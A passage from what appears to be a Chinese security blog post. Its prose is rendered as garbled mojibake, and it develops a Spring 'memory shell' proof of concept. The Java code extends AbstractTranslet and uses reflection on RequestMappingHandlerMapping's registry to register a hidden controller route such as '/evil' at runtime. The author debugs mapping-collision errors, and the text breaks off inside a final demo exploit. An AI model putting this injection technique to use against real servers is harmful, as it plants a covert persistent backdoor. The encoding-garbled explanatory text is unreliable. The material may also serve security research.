<p>ä¸Šä¸‹æ–‡è¿™ä¸ªåœ°æ–¹å°±æ²¡è¡¥å……äº†ï¼Œå¯ä»¥çœ‹å‚è€ƒé‡Œçš„æ–‡ç« ï¼Œå¤§è‡´æœ‰4é’Ÿ</p>
</blockquote>
<h2 id="pocæ„é€ ">pocæ„é€ <a hidden class="anchor" aria-hidden="true" href="#pocæ„é€ ">#</a></h2>
<p>å‰é¢æˆ‘ä»¬åˆ†æè¿‡springæ˜¯æ€ä¹ˆregisterä¼ å…¥å‚æ•°çš„ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œ<code>ä»¿ç…§springä¼ å…¥</code>ä¼šæœ‰ä¸€äº›é—®é¢˜</p>
<p><img loading="lazy" src="images/image-20241119100447530.png" alt="image-20241119100447530"  />
</p>
<p>è¿™ä¸ªæ˜¯æˆ‘æœ€åˆçš„pocï¼Œæœ‰å¾ˆå¤šé—®é¢˜ï¼_!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Exec</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&#34;/exec&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">Exec</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//String userType = &#34;TestController&#34;;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;main&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">context</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TestController</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getMappingForMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getMappingForMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getMappingForMethod</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">invoke</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RequestMappingInfo</span><span class="p">)</span><span class="w"> </span><span class="n">getMappingForMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="p">,</span><span class="w"> </span><span class="n">TestController</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.util.ReflectionUtils&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getDeclaredFields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass1</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;findField&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">getDeclaredFields</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">Fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Field</span><span class="p">)</span><span class="w"> </span><span class="n">getDeclaredFields</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">aClass1</span><span class="p">,</span><span class="w"> </span><span class="n">bean</span><span class="p">.</span><span class="na">getClass</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;mappingRegistry&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Method getDeclaredField = aClass1.getDeclaredMethod(&#34;getField&#34;, Field.class, Object.class);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        getDeclaredField.setAccessible(true);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Object mappingRegistry =  getDeclaredField.invoke(aClass1, Fields, bean);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Fields</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">abstractHandlerMethodMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Fields</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">register</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass2</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;register&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">register</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">register</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">abstractHandlerMethodMapping</span><span class="p">,</span><span class="w"> </span><span class="n">invoke</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;testController&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">getDeclaredMethods</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//abstractHandlerMethodMapping.registerMapping(invoke,&#34;TestController&#34;,methods[2]);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">invoke</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;1111111111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Inject done&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//    }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="o">[]</span><span class="w"> </span><span class="n">handlers</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">DTMAxisIterator</span><span class="w"> </span><span class="n">iterator</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestController</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">ttee</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ttee&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;tteeeeeee&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="å‘ç‚¹1">å‘ç‚¹1<a hidden class="anchor" aria-hidden="true" href="#å‘ç‚¹1">#</a></h3>
<p>è¿™é‡Œ<code>handler</code> springä¼ å…¥çš„æ˜¯ä¸€ä¸ª<code>contorllerç±»çš„åå­—</code>ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ï¼Œ<code>register()ä¸­ä»£ç </code>å¤„ç†æ—¶ï¼Œä¼šåœ¨<code>beanType</code>ä¸­æŸ¥æ‰¾å¯¹åº”çš„ç±»ï¼Œä½†æ˜¯è¿™é‡Œçš„éƒ½æ˜¯springå¯åŠ¨çš„æ—¶å€™åŠ è½½çš„ç±»ï¼Œä¸ä¼šæœ‰æˆ‘ä»¬çš„<code>contorller</code></p>
<p>å¦‚æœæˆ‘ä»¬è¿™é‡Œå†™<code>indexController</code>çš„ï¼Œåé¢<code>æ–¹æ³•</code>å’Œ<code>urlè·¯å¾„</code>ä¹Ÿä¸æ˜¯åœ¨<code>indexController.class</code>çš„ï¼Œåé¢è®¿é—®ä¹Ÿä¼šæœ‰é—®é¢˜</p>
<p><img loading="lazy" src="images/image-20241120102002892.png" alt="image-20241120102002892"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<p><img loading="lazy" src="images/image-20241122173038733.png" alt="image-20241122173038733"  />
</p>
<p>æˆ‘ä»¬çœ‹åˆ°å½“<code>handler</code>ä¸ä¸º<code>string</code>æ—¶ä¼šè¿›å…¥<code>HandlerMethod()</code></p>
<p>è¿™é‡Œæˆ‘ä»¬æ¢æˆ<code>new TestController()</code></p>
<h3 id="å‘ç‚¹2">å‘ç‚¹2<a hidden class="anchor" aria-hidden="true" href="#å‘ç‚¹2">#</a></h3>
<p><img loading="lazy" src="images/image-20241122174749528.png" alt="image-20241122174749528"  />
</p>
<p>è¿™é‡Œç¬¬ä¸€æ­¥æ²¡é—®é¢˜äº†ï¼Œä½†æ˜¯<code>validateMethodMapping()</code>ä¸­æ ¡éªŒæˆ‘ä»¬ä¼ å…¥çš„mappingï¼Œ<strong>æˆ‘ä»¬çš„<code>mapping</code>æ˜¯åœ¨<code>this.registry</code>é‡Œçš„</strong>ï¼Œspringçš„è¿™é‡Œæ˜¯<code>null</code></p>
<p><img loading="lazy" src="images/image-20241122174902506.png" alt="image-20241122174902506"  />
</p>
<p>è¿™é‡Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè¯´æˆ‘ä»¬çš„<code>ttee()å·²ç»mapped</code>è¿‡äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Ambiguous</span><span class="w"> </span><span class="n">mapping</span><span class="p">.</span><span class="w"> </span><span class="n">Cannot</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="err">&#39;</span><span class="n">com</span><span class="p">.</span><span class="na">example</span><span class="p">.</span><span class="na">demo</span><span class="p">.</span><span class="na">demos</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">Exec$TestController</span><span class="nd">@42d2ba5f</span><span class="err">&#39;</span><span class="w"> </span><span class="n">method</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">com</span><span class="p">.</span><span class="na">example</span><span class="p">.</span><span class="na">demo</span><span class="p">.</span><span class="na">demos</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">Exec$TestController</span><span class="err">#</span><span class="n">ttee</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">to</span><span class="w"> </span><span class="p">{</span><span class="n">GET</span><span class="w"> </span><span class="o">[/</span><span class="n">ttee</span><span class="o">]</span><span class="p">}:</span><span class="w"> </span><span class="n">There</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">already</span><span class="w"> </span><span class="err">&#39;</span><span class="n">com</span><span class="p">.</span><span class="na">example</span><span class="p">.</span><span class="na">demo</span><span class="p">.</span><span class="na">demos</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">Exec$TestController</span><span class="err">&#39;</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="n">method</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">com</span><span class="p">.</span><span class="na">example</span><span class="p">.</span><span class="na">demo</span><span class="p">.</span><span class="na">demos</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">Exec$TestController</span><span class="err">#</span><span class="n">ttee</span><span class="p">()</span><span class="w"> </span><span class="n">mapped</span><span class="p">.</span><span class="w">
</span></span></span></code></pre></div><p><strong>whyï¼Ÿ</strong></p>
<p>è·Ÿè¸ª<code>this.register</code>ï¼Œå‘ç°åªæœ‰è°ƒç”¨<code>register()</code>æ‰èƒ½<code>this.register.put()</code>æ”¾å…¥å€¼</p>
<p>æˆ‘ä»¬è¿™é‡Œå†è°ƒè¯•ä¸‹æ˜¯ä¸æ˜¯æˆ‘ä»¬çš„<code>TestController</code>åœ¨æˆ‘ä»¬<code>register()</code>ï¼Œå‰å°±è¢«spring <code>register()</code>äº†</p>
<p><img loading="lazy" src="images/image-20241122181632777.png" alt="image-20241122181632777"  />
</p>
<p><img loading="lazy" src="images/image-20241122181812100.png" alt="image-20241122181812100"  />
</p>
<p>è°ƒè¯•å‘ç° <code>processCandidateBean()</code>è¿™ä¸ªåœ°æ–¹ä¼šå¯¹ç±»è¿›è¡Œæ ¡éªŒï¼Œæœ‰<code>Controller.class</code>å’Œ<code>RequestMapping.class</code><strong>æ³¨è§£</strong>çš„ç±»ä¼šè¿›å…¥<code>detectHandlerMethods()</code>æ–¹æ³•=&gt;åç»­ä¼šè°ƒç”¨<code>register()</code></p>
<blockquote>
<p>è€Œ<code>@RestController</code> æ³¨è§£æœ¬èº«æ˜¯åŸºäº <code>@Controller</code> æ³¨è§£æ‰©å±•è€Œæ¥çš„ï¼Œå¹¶ä¸”åœ¨å†…éƒ¨å®ƒå®é™…ä¸Šæ˜¯åŒæ—¶åŒ…å«äº† <code>@Controller</code> å’Œ <code>@ResponseBody</code> çš„åŠŸèƒ½ç‰¹æ€§ã€‚æ‰€ä»¥è¿™é‡Œä¼šè¿›å…¥if</p>
</blockquote>
<p><strong>è§£å†³ï¼š</strong></p>
<ol>
<li>è¿™é‡ŒæŠŠTestControllerçš„<code>@RestController</code>åˆ æ‰</li>
</ol>
<p>è¿™é‡Œä¼šæ˜¾ç¤ºå†™å…¥æˆåŠŸï¼Œä½†æ˜¯è®¿é—®çš„æ—¶å€™ä¼š404</p>
<ol start="2">
<li>è¿™é‡Œæˆ‘çœ‹åˆ°<code>unregister()</code>,å°±æƒ³åˆ°register()å‰æŠŠè¿™ä¸ªmappingæ³¨é”€äº†ä¸å°±è¡Œäº†</li>
</ol>
<p>å½“ç„¶ï¼Œè¿™æ˜¯å› ä¸ºæ˜¯æœ¬åœ°ä¼šåŠ è½½ï¼Œspringä¼šåŠ è½½è‡ªå·±åŠ è½½æˆ‘ä»¬æœ¬åœ°çš„<code>TestController</code>ï¼Œå¦‚æœæˆ‘ä»¬æœ¬åœ°æ²¡æœ‰<code>TestController.class</code>ååºåˆ—åŒ–å­—èŠ‚ç ä¼šåŠ è½½è¿™ä¸ª<code>TestController</code>è¿˜ä¼šæœ‰è¿™ä¸ªé—®é¢˜ä¹ˆ</p>
<blockquote>
<p>è¿™é‡Œæµ‹è¯•ï¼Œä»å¦ä¸€ä¸ªç¯å¢ƒè°ƒç”¨æ˜¯æ²¡è¿™ä¸ªæŠ¥é”™çš„</p>
</blockquote>
<ol start="3">
<li>ä¸ºä»€ä¹ˆåˆ«äººæ²¡è¿™ä¸ªé—®é¢˜å‘¢ï¼Œè¿™é‡Œä¼°è®¡æ˜¯<code>æ„é€ çš„æ–¹å¼ä¸åŒ</code></li>
</ol>
<p><img loading="lazy" src="images/image-20241122204452056.png" alt="image-20241122204452056"  />
</p>
<p>è¿™ä¸ªåœ°æ–¹ç½‘ä¸Šçš„pocéƒ½æ˜¯nullç›´æ¥å°±è·³è¿‡äº†è¿™é‡Œï¼Œæˆ‘çš„æ˜¯å’Œspringä¸€æ¨¡ä¸€æ ·è°ƒç”¨æ–¹å¼å’Œå‚æ•°ï¼Œè¿™é‡Œgetæ˜¯æ¯”è¾ƒkeyçš„hashï¼Œæ‰€ä»¥æˆ‘çš„pocè¿™é‡Œä¼šå¾—åˆ°å€¼wwwwï¼Œå¯ä»¥ç”¨ä¸‹é¢è¿™ç§æ„é€ </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PatternsRequestCondition</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PatternsRequestCondition</span><span class="p">(</span><span class="s">&#34;/evil&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RequestMethodsRequestCondition</span><span class="w"> </span><span class="n">condition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RequestMethodsRequestCondition</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RequestMappingInfo</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">condition</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><h3 id="demo-poc"><strong>demo poc</strong><a hidden class="anchor" aria-hidden="true" href="#demo-poc">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.demo.demos.web</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Exec</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">(</span><span class="s">&#34;/exec&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">Exec</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;main&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w"> </span><span class="c1">//è·å–ä¸Šä¸‹æ–‡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">context</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
